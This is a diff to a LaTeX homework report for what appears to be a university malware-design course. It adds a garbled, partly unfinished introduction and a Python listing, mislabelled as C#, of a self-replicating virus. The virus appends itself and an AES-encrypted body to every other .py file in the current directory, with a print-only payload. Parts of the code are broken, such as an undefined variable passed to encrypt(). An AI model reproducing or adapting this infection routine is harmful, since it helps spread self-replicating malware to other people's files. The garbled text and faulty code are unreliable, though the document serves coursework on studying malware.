@@ -16,6 +16,7 @@
 \usepackage{stmaryrd}
 \usepackage{array}
 \usepackage{setspace}
+\usepackage{minted}
 
 %%%%%%%%%%%
 % 			Macro		%
@@ -50,4 +51,105 @@
 \author{Vincenzo Arceri VR386484 \\ Giovanni Liboni VR387955 \\ Alberto Marini}
 \title{Malware analysis and design \\ Homework No. 3}
 \maketitle
+
+\section{Introduction}
+The purpose is to design a virus similar to the vbash one, except that it will be encrypted. Its structure is divided in two parts:
+\begin{itemize}
+\item The first part of the code will be unencrypted and will simply consist of the decryption function. The key will be made of the first bytes of the infected virus.
+\item The second part (the most important one) will consist of the main body of the virus.
+\end{itemize}
+The virus will be an appending one. It will spread as follows:
+\begin{itemize}
+\item It looks for infected is executed.
+\item During the infection, it creates a specific key for each file (once again, 
+\end{itemize}
+
+\section{Virus design}
+
+\section{Implementation}
+
+
+
+
+
+\begin{minted}[mathescape,
+               linenos,
+               numbersep=5pt,
+               gobble=2,
+               frame=lines,
+               framesep=2mm]{csharp}
+def is_infected(filename):
+   f = open(filename, 'r')
+   lines = f.readlines()
+   if len(lines) < 46:
+      return False
+   #print len(lines)
+   #print lines[len(lines) - 46]
+   return lines[len(lines) - 46].startswith('######################################################## First script python')
+
+def infect(filename):
+   os.rename(filename, filename + '-copy')
+
+   destination = open(filename, 'w')
+   source = open(filename + '-copy', 'r')
+   this = open(__main__.__file__, 'r')
+
+   # Append the original file
+   for line in source:
+      destination.write(line)
+
+   destination.write("\n######################################################## First script python\n")
+   destination.write("# coding=utf-8\n")
+   destination.write("# Start Uncrypted\n")
+
+   copy = False
+   result = ''
+   for line in this:
+      if line.strip() == '# Start Uncrypted':
+         copy = True
+      elif line.strip() == '# End Uncrypted':
+         destination.write('# End Uncrypted')
+         copy = False
+      elif copy:
+         destination.write(line);
+
+   destination.write("\n# Start payload\n")
+   destination.write("#")
+   destination.write(str(encrypt(e, filename)))
+   destination.write("\n# End payload")
+
+   os.remove(filename + '-copy')
+   source.close()
+   destination.close()
+   this.close()
+ 
+def find_and_infect_files():
+   # In the current directory
+   path = '.'
+   dirs = os.listdir(path)
+
+   # For each file try to infect it
+   for filename in dirs:
+      if filename.endswith('.py') and (not is_infected(filename)) and (filename != "virus.py"):
+         print "Infected " +  str(filename)
+         infect(filename)
+
+def encrypt(data,filename):
+   source = open(filename + '-copy', 'r')
+
+   iv = Random.new().read(AES.block_size)
+   cipher = AES.new(StringIO.StringIO(source).read(24), AES.MODE_CFB, iv)
+   encrypted = iv + cipher.encrypt(data)
+
+   source.close()
+   return base64.b64encode(encrypted)
+ ####################
+
+def payload():
+   print "This file is infected infected! Mhuahauhauahau!"
+
+find_and_infect_files()
+payload()
+\end{minted}
+
 \end{document}
